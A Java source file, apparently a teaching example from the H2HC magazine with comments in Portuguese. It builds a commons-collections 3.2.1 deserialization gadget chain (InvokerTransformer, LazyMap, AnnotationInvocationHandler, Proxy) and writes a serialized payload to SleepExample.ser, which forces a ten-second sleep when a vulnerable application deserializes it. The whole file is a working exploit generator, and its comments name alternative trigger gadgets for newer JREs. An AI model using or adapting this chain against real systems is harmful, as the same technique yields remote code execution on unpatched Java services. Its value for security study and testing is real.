import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.util.*;
/**
 * Gera payload com gadget chain para forçar um Sleep na aplicação.
 * Note que esse payload requer que a commons-collections vulnerável esteja
 * disponível no classpath (<= 3.2.1) e deverá funcionar em sistemas com
 * JRE < 8u72. Em versões maiores, deve-se usufruir de outro gadget como trigger
 * (eg. BadAttributeValueExpException ou HashMap + TiedMapEntry).
 *
 * -----------------------------------------------------------------------
 * Mais detalhes na 12a edição da H2HC (hackers to hackers) magazine:
 * https://www.h2hc.com.br/revista/
 * -----------------------------------------------------------------------
 *
 * OBS: Esse código tem fins apenas didáticos. Algumas cadeias de
 * transformers são baseadas nas versões de Chris Frohoff e/ou Matthias Kaiser
 *
 **** USAGE ****
 *
 * Compilando:
 * $ javac -cp .:commons-collections-3.2.1.jar SleepExample.java
 *
 * Executando
 * $ java -cp .:commons-collections-3.2.1.jar SleepExample
 *
 *
 * @author @joaomatosf
 */
public class SleepExample {
    @SuppressWarnings ( {"unchecked"} )
    public static void main(String[] args)
            throws ClassNotFoundException, NoSuchMethodException, InstantiationException,
            IllegalAccessException, IllegalArgumentException, InvocationTargetException, IOException {

        // Cria array de Transformers que irá resultar na seguinte construção:
        //Thread.class.getMethod("sleep", new Class[]{Long.TYPE}).invoke(null, new Object[]{10000L});
        Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Thread.class), // retorna class Thread.class
            // 1o. Objeto InvokerTransformer: getMethod("sleep", new Class[]{Long.TYPE})
            new InvokerTransformer(
                "getMethod",                        // invoca método getMethod
                ( new Class[] {String.class, Class[].class } ), // tipos dos parâmetros: (String, Class[])
                ( new Object[] {"sleep", new Class[]{Long.TYPE} } ) // parâmetros: (sleep, new Class[]{Long.TYPE})
            ),
            // 2o. Objeto InvokerTransformer: invoke(null, new Object[]{10000L})
            new InvokerTransformer(
                "invoke",                           // invoca método: invoke
                (new Class[] {Object.class, Object[].class }),// tipos dos parâmetros: (Object.class, Object[])
                (new Object[] {null, new Object[] {10000L} }) // parâmetros: (null, new Object[] {10000L})
            )
        };

        // Cria o objeto ChainedTransformer com o array de Transformers:
        Transformer transformerChain = new ChainedTransformer(transformers);
        // Cria o map
        Map map = new HashMap();
        // Decora o map com o LazyMap e a cadeia de transformações como factory
        Map lazyMap = LazyMap.decorate(map,transformerChain);

        // Usa reflexão para obter referencia da classe AnnotationInvocationHandler
        Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        // Obtem construtor da AnnotationInvocationHandler que recebe um tipo (class) e um Map
        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
        // Torna o construtor acessível
        ctor.setAccessible(true);
        // Obtem/Cria instancia do AnnotationInvocationHandler, fornecendo (via construtor) um Retetion.class (que eh um
        // type Annotation, requerido pelo construtor) e atribui o LazyMap (contendo a cadeia de Transformers) ao campo
        // memberValues. Assim, ao tentar obter uma chave inexiste deste campo, a cadeia será "executada"!
        InvocationHandler handlerLazyMap = (InvocationHandler) ctor.newInstance(Retention.class, lazyMap);

        //cria a interface map
        Class[] interfaces = new Class[] {java.util.Map.class};
        // cria o Proxy "entre" a interface Map e o AnnotationInvocationHandler anterior (que contém o lazymap+transformers)
        Map proxyMap = (Map) Proxy.newProxyInstance(null, interfaces, handlerLazyMap);

        // cria outro AnnotationInvocationHandler atribui o Proxy ao campo memberValues
        // esse Proxy será "acionado" no magic method readObject e, assim, desviará o fluxo para o
        // método invoke() do primeiro AnnotationInvocationHandler criado (que contém o LazyMap+Transformers)
        InvocationHandler handlerProxy = (InvocationHandler) ctor.newInstance(Retention.class, proxyMap);

        // Serializa o objeto "handlerProxy" e o salva em arquivo. Ao ser desserializado,
        // o readObject irá executar um map.entrySet() e, assim, desviar o fluxo para o invoke().
        // No invoke(), uma chave inexistente será buscada no campo "memberValues" (que contém um LazyMap
        // com a cadeia de Transformers), o que deverá acionar o Thread.sleep(10000)!
        System.out.println("Saving serialized object in SleepExample.ser");
        FileOutputStream fos = new FileOutputStream("SleepExample.ser");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(handlerProxy);
        oos.flush();

    }

}